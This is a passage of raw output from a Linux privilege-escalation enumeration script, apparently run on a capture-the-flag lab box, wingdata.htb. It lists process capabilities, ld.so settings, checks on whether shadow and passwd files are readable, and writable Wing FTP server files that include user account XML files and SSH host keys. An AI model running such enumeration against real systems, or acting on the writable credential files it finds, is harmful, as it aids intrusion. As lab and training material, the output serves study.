  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 34 (ksmd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 36 (khugepaged) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 37 (kintegrityd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 38 (kblockd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 39 (blkcg_punt_bio) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 40 (tpm_dev_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 41 (edac-poller) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 42 (devfreq_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 43 (kworker/1:1H-kblockd) user=root
  CapInh: 0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep

╔══════════╣ Checking misconfigurations of ld.so (T1574.006)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
  - /usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/vmware-tools-libraries.conf
  - /usr/lib/vmware-tools/lib32/libvmGuestLib.so
  - /usr/lib/vmware-tools/lib64/libvmGuestLib.so
  - /usr/lib/vmware-tools/lib32/libvmGuestLibJava.so
  - /usr/lib/vmware-tools/lib64/libvmGuestLibJava.so
  - /usr/lib/vmware-tools/lib32/libDeployPkg.so
  - /usr/lib/vmware-tools/lib64/libDeployPkg.so
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/ (T1546.004)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
total 12
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rw-r--r--  1 root root  726 Apr  3  2022 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d (T1543.002)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd

╔══════════╣ AppArmor binary profiles (T1518.001)
-rw-r--r-- 1 root root 3461 Mar 30  2023 sbin.dhclient
-rw-r--r-- 1 root root 3448 Mar 12  2023 usr.bin.man

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30) (T1083)
/home/
/root/
/var/www
/var/www/wingdata.htb/index.html
/var/www/wingdata.htb/vendor
/var/www/wingdata.htb/vendor/bootstrap
/var/www/wingdata.htb/vendor/bootstrap/js
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js.map
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.min.js
/var/www/wingdata.htb/vendor/bootstrap/css
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css.map
/var/www/wingdata.htb/vendor/jquery
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.js
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.slim.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.js
/var/www/wingdata.htb/assets
/var/www/wingdata.htb/assets/js
/var/www/wingdata.htb/assets/js/imagesloaded.js
/var/www/wingdata.htb/assets/js/isotope.js
/var/www/wingdata.htb/assets/js/templatemo-custom.js
/var/www/wingdata.htb/assets/js/owl-carousel.js
/var/www/wingdata.htb/assets/js/animation.js
/var/www/wingdata.htb/assets/js/tabs.js
/var/www/wingdata.htb/assets/fonts
/var/www/wingdata.htb/assets/fonts/slick.svg

╔══════════╣ Searching folders owned by me containing others files on it (limit 100) (T1083)

╔══════════╣ Readable files belonging to root and readable by me but not world readable (T1083)

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
awk: write failure (Broken pipe)
awk: close failed on file /dev/stdout (Broken pipe)
uniq: write error: Broken pipe
/etc/vmware-tools/locations.lck
/opt/wftpserver
/opt/wftpserver/Data
/opt/wftpserver/Data/1
/opt/wftpserver/Data/1/groups
/opt/wftpserver/Data/1/portlistener.xml
/opt/wftpserver/Data/1/settings.xml
/opt/wftpserver/Data/1/users
/opt/wftpserver/Data/1/users/anonymous.xml
/opt/wftpserver/Data/1/users/john.xml
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/_ADMINISTRATOR
/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
/opt/wftpserver/Data/_ADMINISTRATOR/settings.xml
/opt/wftpserver/Data/bookmark_db
/opt/wftpserver/Data/settings.xml
/opt/wftpserver/Data/ssh_host_ecdsa_key
/opt/wftpserver/Data/ssh_host_key
/opt/wftpserver/License.txt
/opt/wftpserver/Log
/opt/wftpserver/Log/Admin
/opt/wftpserver/Log/Admin/Admin-2025-11-2.log
/opt/wftpserver/Log/Admin/Admin-2025-11-3.log
/opt/wftpserver/Log/Admin/Admin-2026-1-12.log
/opt/wftpserver/Log/Admin/Admin-2026-1-14.log
/opt/wftpserver/Log/Admin/Admin-2026-1-20.log
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/Log/audit_db
/opt/wftpserver/Log/Domains
/opt/wftpserver/Log/Domains/1
/opt/wftpserver/Log/Domains/1/2026-2-9.log.zip
/opt/wftpserver/Log/Domains/1/2026-5-8.log
/opt/wftpserver/Log/ssh_debug_log
/opt/wftpserver/Log/System
/opt/wftpserver/Log/System/System-2026-2-9.log
/opt/wftpserver/Log/System/System-2026-5-8.log
/opt/wftpserver/lua
/opt/wftpserver/lua/cgiadmin.lua
/opt/wftpserver/lua/cgi.lua
/opt/wftpserver/lua/json.lua
/opt/wftpserver/lua/ServerInterface.lua
/opt/wftpserver/lua/SessionModuleAdmin.lua
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/pid-wftpserver.pid
/opt/wftpserver/README
/opt/wftpserver/session
/opt/wftpserver/session_admin
/opt/wftpserver/version.txt
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/admin_addadmin_form.html
/opt/wftpserver/webadmin/admin_addadmin.html
/opt/wftpserver/webadmin/admin_add_adminipmask.html
/opt/wftpserver/webadmin/admin_addcert_form.html
/opt/wftpserver/webadmin/admin_add_cert.html
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/css/allfonts.min.css
/opt/wftpserver/webadmin/css/bulma.min.css
/opt/wftpserver/webadmin/css/ie6.css
/opt/wftpserver/webadmin/css/style.css
/opt/wftpserver/webadmin/edit_area
/opt/wftpserver/webadmin/edit_area/autocompletion.js
/opt/wftpserver/webadmin/edit_area/edit_area.css
/opt/wftpserver/webadmin/edit_area/edit_area_full.js
/opt/wftpserver/webadmin/edit_area/edit_area_functions.js
/opt/wftpserver/webadmin/edit_area/edit_area.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/edit_area/langs/big5.js
/opt/wftpserver/webadmin/edit_area/langs/ch.js
/opt/wftpserver/webadmin/edit_area/langs/cs.js
/opt/wftpserver/webadmin/edit_area/langs/de.js
/opt/wftpserver/webadmin/edit_area/langs/dk.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/edit_area/manage_area.js
/opt/wftpserver/webadmin/edit_area/regexp.js
/opt/wftpserver/webadmin/edit_area/reg_syntax
/opt/wftpserver/webadmin/edit_area/reg_syntax/c.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/cpp.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/css.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/go.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/html.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/edit_area/reg_syntax.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/js.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/lua.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/pas.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/perl.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/php.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/edit_area/resize_area.js
/opt/wftpserver/webadmin/edit_area/search_replace.js
/opt/wftpserver/webadmin/favicon.ico
/opt/wftpserver/webadmin/help
/opt/wftpserver/webadmin/help/english
/opt/wftpserver/webadmin/help/english/admin_content_dyn.html
/opt/wftpserver/webadmin/help/english/admin_content_static.html
/opt/wftpserver/webadmin/help/english/admin_ftsearch.html
/opt/wftpserver/webadmin/help/english/administration.htm
/opt/wftpserver/webadmin/help/english/administrator_console.htm
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/help_javascript.htm
/opt/wftpserver/webadmin/icons
/opt/wftpserver/webadmin/images
/opt/wftpserver/webadmin/images/logo.ico
/opt/wftpserver/webadmin/images/treeview
/opt/wftpserver/webadmin/include
/opt/wftpserver/webadmin/include/arale-qrcode.js
/opt/wftpserver/webadmin/include/common.js
/opt/wftpserver/webadmin/include/dygraph.js
/opt/wftpserver/webadmin/include/excanvas.js
/opt/wftpserver/webadmin/include/json.js
#)You_can_write_even_more_files_inside_last_directory

/opt/wftpserver/webadmin/keeplive.html
/opt/wftpserver/webadmin/language
/opt/wftpserver/webadmin/language/czech.html
/opt/wftpserver/webadmin/language/dutch.html
/opt/wftpserver/webadmin/language/english.html
